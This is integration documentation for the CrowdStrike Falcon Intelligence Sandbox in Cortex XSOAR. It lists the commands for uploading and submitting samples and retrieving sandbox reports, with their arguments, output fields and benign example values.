Use the CrowdStrike Falcon Intelligence Sandbox integration to submit files, file hashes, URLs, and FTPs for sandbox analysis, and to retrieve reports.
This integration was integrated and tested with version 2 of CrowdStrike Falcon Intelligence Sandbox

## Configure CrowdStrike Falcon Intelligence Sandbox in Cortex


| **Parameter** | **Description** | **Required** |
| --- | --- | --- |
| Cloud Base URL (e.g., https://api.crowdstrike.com) |  | False |
| Client ID |  | True |
| Password |  | True |
| Trust any certificate (not secure) |  | False |
| Use system proxy settings |  | False |
| Source Reliability | Reliability of the source providing the intelligence data |  |



## Uploading a file to the sandbox
There are 2 ways to upload a file to the sandbox.
1. Using the ***cs-fx-upload-file*** command with **submit_file=yes**.
2. Using the ***cs-fx-upload-file*** command and afterwards the ***cs-fx-submit-uploaded-file command***, 
in this option the sha256 identifier from the ***cs-fx-upload-file*** command output is the input to the ***cs-fx-submit-uploaded-file command***.

For more information review the documentation for the commands.

## Commands
You can execute these commands from the CLI, as part of an automation, or in a playbook.
After you successfully execute a command, a DBot message appears in the War Room with the command details.
### cs-fx-upload-file
***
Uploads a file for sandbox analysis.
Notice that the file identifier (SHA) can be changed as shown in the example below.

#### Base Command

`cs-fx-upload-file`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| file_name | Name of the file to upload for sandbox analysis. | Optional | 
| ids | This ia an internal argument used for the polling process, not to be used by the user. | Optional | 
| comment | A descriptive comment to identify the file for other users. | Optional | 
| is_confidential | Determines the visibility of this file in Falcon MalQuery. Can be "true" or "false". If "true", the file is confidential. Possible values are: true, false. | Optional | 
| file | Content of the uploaded sample in binary format, This arg can also receive entry ID from war room. | Optional | 
| polling | Whether to use Cortex XSOAR's built-in polling to retrieve the result when it's ready. Possible values are: true, false. | Optional | 
| extended_data | If set to true, the report will return extended data which includes mitre attacks and signature information. Possible values are: true, false. Default is false. | Optional | 
| interval_in_seconds | Interval in seconds between each poll. Default is 600. | Optional | 
| submit_file | Whether to submit the given file to the sandbox. Can be "yes" or "no". Default is "no". Possible values are: no, yes. Default is no. | Optional | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.sha256 | String | SHA256 hash of the uploaded file. | 
| csfalconx.resource.file_name | String | Name of the uploaded file.  |
| csfalconx.resource.tags | String | Analysis tags. | 
| csfalconx.resource.sandbox.http_requests.header | String | The header of the http request. | 
| csfalconx.resource.sandbox.http_requests.Accept | String | The accept of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_ip | String | The host ip of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_port | Number | The host port of the http request. | 
| csfalconx.resource.sandbox.http_requests.method | String | The method of the http request. | 
| csfalconx.resource.sandbox.http_requests.url | String | The URL of the http request. | 
| csfalconx.resource.sandbox.User-Agent | String | The user agent of the http request. | 
| csfalconx.resource.sandbox.processes.command_line | String | The sandbox process command line. | 
| csfalconx.resource.sandbox.processes.handles.id | String | The sandbox handled ID. | 
| csfalconx.resource.sandbox.processes.handles.type | String | The sandbox handled type. | 
| csfalconx.resource.sandbox.processes.handles.path | String | The sandbox handled path. | 
| csfalconx.resource.sandbox.processes.name | String | The sandbox process name. | 
| csfalconx.resource.sandbox.processes.normalized_path | String | The sandbox process normalized path. | 
| csfalconx.resource.sandbox.processes.pid | Number | The sandbox process pid. | 
| csfalconx.resource.sandbox.processes.sha256 | String | The sandbox process sha256. | 
| csfalconx.resource.sandbox.architecture | String | The sandbox architecture. | 
| csfalconx.resource.sandbox.classification | String | The sandbox classification. | 
| csfalconx.resource.sandbox.classification_tags | String | The sandbox classification tags. | 
| csfalconx.resource.sandbox.extracted_files.name | String | The sandbox extracted file name. | 
| csfalconx.resource.sandbox.extracted_files.file_size | Number | The sandbox extracted file size. | 
| csfalconx.resource.sandbox.extracted_files.sha256 | String | The sandbox extracted file sha256. | 
| csfalconx.resource.sandbox.extracted_files.md5 | String | The sandbox extracted file md5. | 
| csfalconx.resource.sandbox.extracted_files.sha1 | String | The sandbox extracted file sha1. | 
| csfalconx.resource.sandbox.extracted_files.runtime_process | String | The sandbox extracted file runtime process. | 
| csfalconx.resource.sandbox.extracted_files.type_tags | String | The sandbox extracted file tags type. | 
| csfalconx.resource.sandbox.extracted_files.threat_level_readable | String | The sandbox extracted file threat level readable. | 
| csfalconx.resource.sandbox.extracted_files.description | String | The sandbox extracted file description. | 
| csfalconx.resource.sandbox.file_metadata.file_compositions | Unknown | The sandbox file metadata compositions. | 
| csfalconx.resource.sandbox.file_metadata.imported_objects | Unknown | The sandbox file metadata imported objects. | 
| csfalconx.resource.sandbox.file_metadata.file_analysis | Unknown | The sandbox file metadata analysis. | 
| csfalconx.resource.sandbox.file_size | Number | The sandbox file size. | 
| csfalconx.resource.sandbox.file_type | String | The sandbox file type. | 
| csfalconx.resource.sandbox.file_type_short | String | The sandbox file type short. | 
| csfalconx.resource.sandbox.packer | String | The sandbox packer. | 
| csfalconx.resource.sandbox.screenshots_artifact_ids | String | The sandbox screenshots artifact ids. | 
| csfalconx.resource.sandbox.dns_requests.address | String | The sandbox dns requests address. | 
| csfalconx.resource.sandbox.dns_requests.country | String | The sandbox dns requests country. | 
| csfalconx.resource.sandbox.dns_requests.domain | String | The sandbox dns requests domain. | 
| csfalconx.resource.sandbox.dns_requests.registrar_creation_timestamp | String | The sandbox dns requests registrar creation timestamp. | 
| csfalconx.resource.sandbox.dns_requests.registrar_name | String | The sandbox dns requests registrar name. | 
| csfalconx.resource.sandbox.dns_requests.registrar_organization | String | The sandbox dns requests registrar organization. | 
| csfalconx.resource.sandbox.contacted_hosts.address | String | The sandbox contacted hosts address. | 
| csfalconx.resource.sandbox.contacted_hosts.country | String | The sandbox contacted hosts country. | 
| csfalconx.resource.sandbox.contacted_hosts.port | Number | The sandbox contacted hosts port. | 
| csfalconx.resource.sandbox.contacted_hosts.protocol | String | The sandbox contacted hosts protocol. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.name | String | The sandbox contacted hosts associated runtime name. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.pid | String | The sandbox contacted hosts associated runtime pid. | 
| csfalconx.resource.sandbox.incidents | String | The sandbox incidents. | 
| csfalconx.resource.sandbox.mitre_attacks.tactic | String | The sndbox MITRE tactic name. | 
| csfalconx.resource.sandbox.mitre_attacks.technique | String | The sndbox MITRE technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.attack_id | String | The sndbox MITRE technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.malicious_identifiers | String | The sndbox MITRE malicious identifiers. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.technique | String | The sndbox MITRE parent technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id | String | The sndbox MITRE parent technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id_wiki | String | The sndbox MITRE parent technique wiki URL link. | 
| csfalconx.resource.sandbox.signatures.threat_level_human | String | The sndbox signatures threat level. | 
| csfalconx.resource.sandbox.signatures.category | String | The sndbox signatures category. | 
| csfalconx.resource.sandbox.signatures.identifier | String | The sndbox signatures identifier. | 
| csfalconx.resource.sandbox.signatures.type | Number | The sndbox signatures type. | 
| csfalconx.resource.sandbox.signatures.relevance | Number | The sndbox signatures relevance. | 
| csfalconx.resource.sandbox.signatures.name | String | The sndbox signatures name. | 
| csfalconx.resource.sandbox.signatures.description | String | The sndbox signatures description. | 
| csfalconx.resource.sandbox.signatures.origin | String | The sndbox signatures origin. | 
| csfalconx.resource.intel.malware_families | Unknown | The malware families of the resource. | 
| csfalconx.resource.sha256 | String | SHA256 hash of the uploaded file. | 


#### Command Example
```!cs-fx-upload-file file=895@07031695-ae27-49f6-8bb2-41943c7cb80c file_name=test.pdf comment="example" is_confidential="true" submit_file=no```

#### Context Example
```
{
    "csfalconx": {
        "resource": {
            "file_name": "test.pdf",
            "sha256": "c5fdd1fb2c53cd00aba5b01270f91fd5598f315bef99938ddeb92c23667ec2c9"
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|file_name|sha256|
>|---|---|
>| test.pdf | c5fdd1fb2c53cd00aba5b01270f91fd5598f315bef99938ddeb92c23667ec2c9 |


### cs-fx-submit-uploaded-file
***
Submits a sample SHA256 hash for sandbox analysis.
Notice that the file identifiers, SHA and ID are not the same.


#### Base Command

`cs-fx-submit-uploaded-file`
#### Input

| **Argument Name** | **Description**                                                                                                                                                                                    | **Required** |
| --- |----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------| --- |
| sha256 | SHA256 ID of the sample, which is a SHA256 hash value. Find the sample ID from the response when uploading a malware sample or search with the cs-fx-upload-file command.                          | Optional | 
| environment_id | Sandbox environment used for analysis. Possible values are: 310: Linux Ubuntu 20, 64-bit, 200: Android (static analysis), 160: Windows 10, 64-bit, 110: Windows 7, 64-bit, 100: Windows 7, 32-bit. | Optional | 
| action_script | Runtime script for sandbox analysis. Possible values are: default, default_maxantievasion, default_randomfiles, default_randomtheme, default_openie.                                               | Optional | 
| command_line | Command line script passed to the submitted file at runtime. Max length: 2048 characters.                                                                                                          | Optional | 
| document_password | Auto-filled for Adobe or Office files that prompt for a password. Max length: 32 characters.                                                                                                       | Optional | 
| enable_tor | Whether the sandbox analysis routes network traffic via TOR. Can be "true" or "false". If true, sandbox analysis routes network traffic via TOR. Possible values are: true, false.                 | Optional | 
| submit_name | Name of the malware sample that’s used for file type detection. and analysis.                                                                                                                      | Optional | 
| system_date | Set a custom date for the sandbox environment in the format yyyy-MM-dd.                                                                                                                            | Optional | 
| polling | Whether to use Cortex XSOAR's built-in polling to retrieve the result when it's ready, Note - This command counts against the submission quota. Possible values are: true, false.                  | Optional | 
| extended_data | If set to true, the report will return extended data which includes mitre attacks and signature information. Possible values are: true, false. Default is false.                                   | Optional | 
| ids | This ia an internal argument used for the polling process, not to be used by the user.                                                                                                             | Optional | 
| interval_in_seconds | Interval in seconds between each poll. Default is 600.                                                                                                                                             | Optional | 
| system_time | Sets a custom time for the sandbox environment in the format HH:mm.                                                                                                                                | Optional | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.uploaded_id | String | Analysis ID received after uploading the file. |
| csfalconx.resource.state | String | Analysis state. | 
| csfalconx.resource.created_timestamp | Date | Analysis start time. | 
| csfalconx.resource.submitted_id | String | Analysis ID received after submitting the file. | 
| csfalconx.resource.sha256 | Unknown | SHA256 hash of the scanned file. | 
| csfalconx.resource.environment_id | Unknown | Environment ID of the analysis.  | 
| csfalconx.resource.file_name | String | Name of the uploaded file.  | 
| csfalconx.resource.tags | String | Analysis tags. | 
| csfalconx.resource.sandbox.http_requests.header | String | The header of the http request. | 
| csfalconx.resource.sandbox.http_requests.Accept | String | The accept of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_ip | String | The host ip of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_port | Number | The host port of the http request. | 
| csfalconx.resource.sandbox.http_requests.method | String | The method of the http request. | 
| csfalconx.resource.sandbox.http_requests.url | String | The URL of the http request. | 
| csfalconx.resource.sandbox.User-Agent | String | The user agent of the http request. | 
| csfalconx.resource.sandbox.processes.command_line | String | The sandbox process command line. | 
| csfalconx.resource.sandbox.processes.handles.id | String | The sandbox handled ID. | 
| csfalconx.resource.sandbox.processes.handles.type | String | The sandbox handled type. | 
| csfalconx.resource.sandbox.processes.handles.path | String | The sandbox handled path. | 
| csfalconx.resource.sandbox.processes.name | String | The sandbox process name. | 
| csfalconx.resource.sandbox.processes.normalized_path | String | The sandbox process normalized path. | 
| csfalconx.resource.sandbox.processes.pid | Number | The sandbox process pid. | 
| csfalconx.resource.sandbox.processes.sha256 | String | The sandbox process sha256. | 
| csfalconx.resource.sandbox.architecture | String | The sandbox architecture. | 
| csfalconx.resource.sandbox.classification | String | The sandbox classification. | 
| csfalconx.resource.sandbox.classification_tags | String | The sandbox classification tags. | 
| csfalconx.resource.sandbox.extracted_files.name | String | The sandbox extracted file name. | 
| csfalconx.resource.sandbox.extracted_files.file_size | Number | The sandbox extracted file size. | 
| csfalconx.resource.sandbox.extracted_files.sha256 | String | The sandbox extracted file sha256. | 
| csfalconx.resource.sandbox.extracted_files.md5 | String | The sandbox extracted file md5. | 
| csfalconx.resource.sandbox.extracted_files.sha1 | String | The sandbox extracted file sha1. | 
| csfalconx.resource.sandbox.extracted_files.runtime_process | String | The sandbox extracted file runtime process. | 
| csfalconx.resource.sandbox.extracted_files.type_tags | String | The sandbox extracted file tags type. | 
| csfalconx.resource.sandbox.extracted_files.threat_level_readable | String | The sandbox extracted file threat level readable. | 
| csfalconx.resource.sandbox.extracted_files.description | String | The sandbox extracted file description. | 
| csfalconx.resource.sandbox.file_metadata.file_compositions | Unknown | The sandbox file metadata compositions. | 
| csfalconx.resource.sandbox.file_metadata.imported_objects | Unknown | The sandbox file metadata imported objects. | 
| csfalconx.resource.sandbox.file_metadata.file_analysis | Unknown | The sandbox file metadata analysis. | 
| csfalconx.resource.sandbox.file_size | Number | The sandbox file size. | 
| csfalconx.resource.sandbox.file_type | String | The sandbox file type. | 
| csfalconx.resource.sandbox.file_type_short | String | The sandbox file type short. | 
| csfalconx.resource.sandbox.packer | String | The sandbox packer. | 
| csfalconx.resource.sandbox.screenshots_artifact_ids | String | The sandbox screenshots artifact ids. | 
| csfalconx.resource.sandbox.dns_requests.address | String | The sandbox dns requests address. | 
| csfalconx.resource.sandbox.dns_requests.country | String | The sandbox dns requests country. | 
| csfalconx.resource.sandbox.dns_requests.domain | String | The sandbox dns requests domain. | 
| csfalconx.resource.sandbox.dns_requests.registrar_creation_timestamp | String | The sandbox dns requests registrar creation timestamp. | 
| csfalconx.resource.sandbox.dns_requests.registrar_name | String | The sandbox dns requests registrar name. | 
| csfalconx.resource.sandbox.dns_requests.registrar_organization | String | The sandbox dns requests registrar organization. | 
| csfalconx.resource.sandbox.contacted_hosts.address | String | The sandbox contacted hosts address. | 
| csfalconx.resource.sandbox.contacted_hosts.country | String | The sandbox contacted hosts country. | 
| csfalconx.resource.sandbox.contacted_hosts.port | Number | The sandbox contacted hosts port. | 
| csfalconx.resource.sandbox.contacted_hosts.protocol | String | The sandbox contacted hosts protocol. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.name | String | The sandbox contacted hosts associated runtime name. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.pid | String | The sandbox contacted hosts associated runtime pid. | 
| csfalconx.resource.sandbox.incidents | String | The sandbox incidents. | 
| csfalconx.resource.sandbox.mitre_attacks.tactic | String | The sndbox MITRE tactic name. | 
| csfalconx.resource.sandbox.mitre_attacks.technique | String | The sndbox MITRE technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.attack_id | String | The sndbox MITRE technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.malicious_identifiers | String | The sndbox MITRE malicious identifiers. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.technique | String | The sndbox MITRE parent technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id | String | The sndbox MITRE parent technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id_wiki | String | The sndbox MITRE parent technique wiki URL link. | 
| csfalconx.resource.sandbox.signatures.threat_level_human | String | The sndbox signatures threat level. | 
| csfalconx.resource.sandbox.signatures.category | String | The sndbox signatures category. | 
| csfalconx.resource.sandbox.signatures.identifier | String | The sndbox signatures identifier. | 
| csfalconx.resource.sandbox.signatures.type | Number | The sndbox signatures type. | 
| csfalconx.resource.sandbox.signatures.relevance | Number | The sndbox signatures relevance. | 
| csfalconx.resource.sandbox.signatures.name | String | The sndbox signatures name. | 
| csfalconx.resource.sandbox.signatures.description | String | The sndbox signatures description. | 
| csfalconx.resource.sandbox.signatures.origin | String | The sndbox signatures origin. | 
| csfalconx.resource.intel.malware_families | Unknown | The malware families of the resource. | 
| DBotScore.Indicator | String | The indicator that was tested. | 
| DBotScore.Reliability | String | Reliability of the source providing the intelligence data. | 
| DBotScore.Score | Number | The actual score. | 
| DBotScore.Type | String | The indicator type. | 
| DBotScore.Vendor | String | The vendor used to calculate the score. | 
| File.SHA1 | String | The SHA1 hash of the file. | 
| File.SHA256 | String | The SHA256 hash of the file. | 
| File.Name | String | The name of the file. |
| File.MD5 | String | The MD5 hash of the file. | 
| File.Malicious.Vendor | String | For malicious files, the vendor that made the decision. | 
| File.Malicious.Description | String | For malicious files, the reason that the vendor made the decision. | 


#### Command Example
```!cs-fx-submit-uploaded-file sha256="d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee" environment_id="160: Windows 10" action_script="default" command_line="command" document_password="password" enable_tor="false" submit_name="malware_test" system_date="2020-08-10" system_time="12:48"```

#### Context Example
```json
{
    "csfalconx": {
        "resource": {
            "created_timestamp": "2022-03-09T08:58:33Z",
            "environment_id": 160,
            "sha256": "d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee",
            "state": "created",
            "file_name": "test.pdf",
            "submitted_id": "20879a8064904ecfbb62c118a6a19411_5d620c1322444253ad2be284de3756fa"
        }
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>|created_timestamp|environment_id|sha256|state|submitted_id|file_name|
>|---|---|---|---|---|
>| 2022-03-09T08:58:33Z | 160 | d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee | created | 20879a8064904ecfbb62c118a6a19411_5d620c1322444253ad2be284de3756fa | test.pdf |


### cs-fx-get-full-report
***
Gets a full version of a sandbox report.


#### Base Command

`cs-fx-get-full-report`
#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| ids | ID of a submitted malware sample. Find a submission ID from the response when submitting a malware sample or search with the cs-fx-submit-uploaded-file command. | Required | 
| extended_data | If set to true, the report will return extended data which includes mitre attacks and signature information. Possible values are: true, false. Default is false. | Optional | 


#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| csfalconx.resource.submitted_id | String | Analysis ID received after submitting the file. | 
| csfalconx.resource.verdict | String | Analysis verdict. | 
| csfalconx.resource.created_timestamp | String | Analysis start time. | 
| csfalconx.resource.environment_id | String | Environment ID. | 
| csfalconx.resource.sandbox.environment_description | String | Environment description. |
| csfalconx.resource.threat_score | Int | Score of the threat. | 
| csfalconx.resource.submit_url | String | URL submitted for analysis. | 
| csfalconx.resource.submission_type | String | Type of submitted artifact, for example file, URL, etc. | 
| csfalconx.resource.file_type | String | File type. | 
| csfalconx.resource.file_size | Int | File size. | 
| csfalconx.resource.sha256 | String | SHA256 hash of the submitted file. | 
| csfalconx.resource.ioc_report_strict_csv_artifact_id | String | ID of the IOC pack to download \(CSV\). | 
| csfalconx.resource.ioc_report_broad_csv_artifact_id | String | ID of the IOC pack to download \(CSV\). | 
| csfalconx.resource.ioc_report_strict_json_artifact_id | Int | ID of the IOC pack to download \(JSON\). | 
| csfalconx.resource.ioc_report_broad_json_artifact_id | String | ID of the IOC pack to download \(JSON\). | 
| csfalconx.resource.ioc_report_strict_stix_artifact_id | String | ID of the IOC pack to download \(STIX\). | 
| csfalconx.resource.ioc_report_broad_stix_artifact_id | Int | ID of the IOC pack to download \(STIX\). | 
| csfalconx.resource.ioc_report_strict_maec_artifact_id | String | ID of the IOC pack to download \(MAEC\). | 
| csfalconx.resource.ioc_report_broad_maec_artifact_id | String | ID of the IOC pack to download \(MAEC\). | 
| csfalconx.resource.tags | String | Analysis tags. | 
| csfalconx.resource.file_name | String | Name of the uploaded file.  | 
| csfalconx.resource.sandbox.http_requests.header | String | The header of the http request. | 
| csfalconx.resource.sandbox.http_requests.Accept | String | The accept of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_ip | String | The host ip of the http request. | 
| csfalconx.resource.sandbox.http_requests.host_port | Number | The host port of the http request. | 
| csfalconx.resource.sandbox.http_requests.method | String | The method of the http request. | 
| csfalconx.resource.sandbox.http_requests.url | String | The URL of the http request. | 
| csfalconx.resource.sandbox.User-Agent | String | The user agent of the http request. | 
| csfalconx.resource.sandbox.processes.command_line | String | The sandbox process command line. | 
| csfalconx.resource.sandbox.processes.handles.id | String | The sandbox handled ID. | 
| csfalconx.resource.sandbox.processes.handles.type | String | The sandbox handled type. | 
| csfalconx.resource.sandbox.processes.handles.path | String | The sandbox handled path. | 
| csfalconx.resource.sandbox.processes.name | String | The sandbox process name. | 
| csfalconx.resource.sandbox.processes.normalized_path | String | The sandbox process normalized path. | 
| csfalconx.resource.sandbox.processes.pid | Number | The sandbox process pid. | 
| csfalconx.resource.sandbox.processes.sha256 | String | The sandbox process sha256. | 
| csfalconx.resource.sandbox.architecture | String | The sandbox architecture. | 
| csfalconx.resource.sandbox.classification | String | The sandbox classification. | 
| csfalconx.resource.sandbox.classification_tags | String | The sandbox classification tags. | 
| csfalconx.resource.sandbox.extracted_files.name | String | The sandbox extracted file name. | 
| csfalconx.resource.sandbox.extracted_files.file_size | Number | The sandbox extracted file size. | 
| csfalconx.resource.sandbox.extracted_files.sha256 | String | The sandbox extracted file sha256. | 
| csfalconx.resource.sandbox.extracted_files.md5 | String | The sandbox extracted file md5. | 
| csfalconx.resource.sandbox.extracted_files.sha1 | String | The sandbox extracted file sha1. | 
| csfalconx.resource.sandbox.extracted_files.runtime_process | String | The sandbox extracted file runtime process. | 
| csfalconx.resource.sandbox.extracted_files.type_tags | String | The sandbox extracted file tags type. | 
| csfalconx.resource.sandbox.extracted_files.threat_level_readable | String | The sandbox extracted file threat level readable. | 
| csfalconx.resource.sandbox.extracted_files.description | String | The sandbox extracted file description. | 
| csfalconx.resource.sandbox.file_metadata.file_compositions | Unknown | The sandbox file metadata compositions. | 
| csfalconx.resource.sandbox.file_metadata.imported_objects | Unknown | The sandbox file metadata imported objects. | 
| csfalconx.resource.sandbox.file_metadata.file_analysis | Unknown | The sandbox file metadata analysis. | 
| csfalconx.resource.sandbox.file_size | Number | The sandbox file size. | 
| csfalconx.resource.sandbox.file_type | String | The sandbox file type. | 
| csfalconx.resource.sandbox.file_type_short | String | The sandbox file type short. | 
| csfalconx.resource.sandbox.packer | String | The sandbox packer. | 
| csfalconx.resource.sandbox.screenshots_artifact_ids | String | The sandbox screenshots artifact ids. | 
| csfalconx.resource.sandbox.dns_requests.address | String | The sandbox dns requests address. | 
| csfalconx.resource.sandbox.dns_requests.country | String | The sandbox dns requests country. | 
| csfalconx.resource.sandbox.dns_requests.domain | String | The sandbox dns requests domain. | 
| csfalconx.resource.sandbox.dns_requests.registrar_creation_timestamp | String | The sandbox dns requests registrar creation timestamp. | 
| csfalconx.resource.sandbox.dns_requests.registrar_name | String | The sandbox dns requests registrar name. | 
| csfalconx.resource.sandbox.dns_requests.registrar_organization | String | The sandbox dns requests registrar organization. | 
| csfalconx.resource.sandbox.contacted_hosts.address | String | The sandbox contacted hosts address. | 
| csfalconx.resource.sandbox.contacted_hosts.country | String | The sandbox contacted hosts country. | 
| csfalconx.resource.sandbox.contacted_hosts.port | Number | The sandbox contacted hosts port. | 
| csfalconx.resource.sandbox.contacted_hosts.protocol | String | The sandbox contacted hosts protocol. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.name | String | The sandbox contacted hosts associated runtime name. | 
| csfalconx.resource.sandbox.contacted_hosts.associated_runtime.pid | String | The sandbox contacted hosts associated runtime pid. | 
| csfalconx.resource.sandbox.incidents | String | The sandbox incidents. | 
| csfalconx.resource.sandbox.mitre_attacks.tactic | String | The sndbox MITRE tactic name. | 
| csfalconx.resource.sandbox.mitre_attacks.technique | String | The sndbox MITRE technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.attack_id | String | The sndbox MITRE technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.malicious_identifiers | String | The sndbox MITRE malicious identifiers. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.technique | String | The sndbox MITRE parent technique name. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id | String | The sndbox MITRE parent technique ID. | 
| csfalconx.resource.sandbox.mitre_attacks.parent.attack_id_wiki | String | The sndbox MITRE parent technique wiki URL link. | 
| csfalconx.resource.sandbox.signatures.threat_level_human | String | The sndbox signatures threat level. | 
| csfalconx.resource.sandbox.signatures.category | String | The sndbox signatures category. | 
| csfalconx.resource.sandbox.signatures.identifier | String | The sndbox signatures identifier. | 
| csfalconx.resource.sandbox.signatures.type | Number | The sndbox signatures type. | 
| csfalconx.resource.sandbox.signatures.relevance | Number | The sndbox signatures relevance. | 
| csfalconx.resource.sandbox.signatures.name | String | The sndbox signatures name. | 
| csfalconx.resource.sandbox.signatures.description | String | The sndbox signatures description. | 
| csfalconx.resource.sandbox.signatures.origin | String | The sndbox signatures origin. | 
| csfalconx.resource.intel.malware_families | Unknown | The malware families of the resource. | 
| csfalconx.resource.architecture | String | The architecture of the machine on which the report was created. | 
| csfalconx.resource.classification | String | Classification | 
| csfalconx.resource.classification_tags | String | Tags related to the classification. | 
| csfalconx.resource.contacted_hosts.address | String | Address of a contacted host. | 
| csfalconx.resource.contacted_hosts.associated_runtime.name | String | The sandbox contacted hosts associated runtime name. | 
| csfalconx.resource.contacted_hosts.associated_runtime.pid | Number | The sandbox contacted hosts associated runtime pid. | 
| csfalconx.resource.contacted_hosts.country | String | The sandbox contacted hosts country. | 
| csfalconx.resource.contacted_hosts.port | Number | The sandbox contacted hosts port. | 
| csfalconx.resource.contacted_hosts.protocol | String | The sandbox contacted hosts protocol. | 
| csfalconx.resource.created_timestamp | Date | Analysis start time. | 
| csfalconx.resource.dns_requests.country | String | Country the DNS request was sent to. | 
| csfalconx.resource.dns_requests.domain | String | Domain the DNS request was sent to. | 
| csfalconx.resource.dns_requests.address | String | Address the DNS request was sent to. | 
| csfalconx.resource.environment_description | String | Environment description. | 
| csfalconx.resource.extracted_files.description | String | Description of an extracted file. | 
| csfalconx.resource.extracted_files.file_size | Number | Size of an extracted file | 
| csfalconx.resource.extracted_files.md5 | String | MD5 of an extracted file. | 
| csfalconx.resource.extracted_files.name | String | Name of an extracted file. | 
| csfalconx.resource.extracted_files.sha1 | String | SHA1 of an extracted file. | 
| csfalconx.resource.extracted_files.sha256 | String | SHA256 of an extracted file. | 
| csfalconx.resource.extracted_files.threat_level_readable | String | Threat level of an extracted file. | 
| csfalconx.resource.extracted_files.type_tags | String | Type tags of an extracted file. | 
| csfalconx.resource.file_size | Number | File size. | 
| csfalconx.resource.file_type | String | File type. | 
| csfalconx.resource.file_type_short | String | File type \(short\). | 
| csfalconx.resource.http_requests.header | String | HTTP request header. | 
| csfalconx.resource.http_requests.host | String | HTTP request host. | 
| csfalconx.resource.http_requests.host_ip | String | HTTP request host IP. | 
| csfalconx.resource.http_requests.host_port | Number | HTTP request host IP. | 
| csfalconx.resource.http_requests.method | String | HTTP request method. | 
| csfalconx.resource.http_requests.url | String | HTTP request URL. | 
| csfalconx.resource.id | String | Analysis ID. | 
| csfalconx.resource.incidents.details | String | Indicent details. | 
| csfalconx.resource.incidents.name | String | Indicent name. | 
| csfalconx.resource.processes.command_line | String | Process command line. | 
| csfalconx.resource.processes.file_accesses.mask | String | File access mask. | 
| csfalconx.resource.processes.file_accesses.path | String | File access path. | 
| csfalconx.resource.processes.file_accesses.type | String | File access type. | 
| csfalconx.resource.processes.handles.id | Number | Process handle ID. | 
| csfalconx.resource.processes.handles.path | String | Process handle path. | 
| csfalconx.resource.processes.handles.type | String | Process handle type. | 
| csfalconx.resource.processes.icon_artifact_id | String | Process icon artifact ID. | 
| csfalconx.resource.processes.mutants | String | Process mutants. | 
| csfalconx.resource.processes.name | String | Process name. | 
| csfalconx.resource.processes.normalized_path | String | Process normalized path. | 
| csfalconx.resource.processes.pid | Number | Process ID \(PID\). | 
| csfalconx.resource.processes.sha256 | String | Process SHA256. | 
| csfalconx.resource.processes.uid | String | Process UID. | 
| csfalconx.resource.processes.parent_uid | String | Process parent UID. | 
| csfalconx.resource.processes.process_flags.name | String | Process flag name. | 
| csfalconx.resource.sandbox.http_requests.header | String | Sandbox HTTP request header. | 
| csfalconx.resource.sandbox.http_requests.host | String | Sandbox HTTP request host. | 
| csfalconx.resource.sandbox.http_requests.host_ip | String | Sandbox HTTP request host IP. | 
| csfalconx.resource.sandbox.http_requests.host_port | Number | Sandbox HTTP request host port. | 
| csfalconx.resource.sandbox.http_requests.method | String | Sandbox HTTP request method. | 
| csfalconx.resource.sandbox.http_requests.url | String | Sandbox HTTP request URL. | 
| csfalconx.resource.sandbox.incidents.details | String | Sandbox incident details. | 
| csfalconx.resource.sandbox.incidents.name | String | Sandbox incident name. | 
| csfalconx.resource.sandbox.processes.file_accesses.mask | String | Sandbox process file access mask. | 
| csfalconx.resource.sandbox.processes.file_accesses.path | String | Sandbox process file access path. | 
| csfalconx.resource.sandbox.processes.file_accesses.type | String | Sandbox process file access type. | 
| csfalconx.resource.sandbox.processes.icon_artifact_id | String | Sandbox process file access icon artifact ID. | 
| csfalconx.resource.sandbox.processes.mutants | String | Sandbox process file access process mutants. | 
| csfalconx.resource.sandbox.processes.uid | String | Sandbox process file access process UID. | 
| csfalconx.resource.sandbox.processes.parent_uid | String | Sandbox process file access process parent UID. | 
| csfalconx.resource.sandbox.processes.process_flags.name | String | Sandbox process file access process flag name. | 
| csfalconx.resource.sandbox.submit_name | String | Sandbox submit name. | 
| csfalconx.resource.screenshots_artifact_ids | String | Screenshot artifact IDs. | 
| csfalconx.resource.submit_name | String | Submit name. | 
| DBotScore.Indicator | String | The indicator that was tested. | 
| DBotScore.Reliability | String | Reliability of the source providing the intelligence data. | 
| DBotScore.Score | Number | The actual score. | 
| DBotScore.Type | String | The indicator type. | 
| DBotScore.Vendor | String | The vendor used to calculate the score. | 
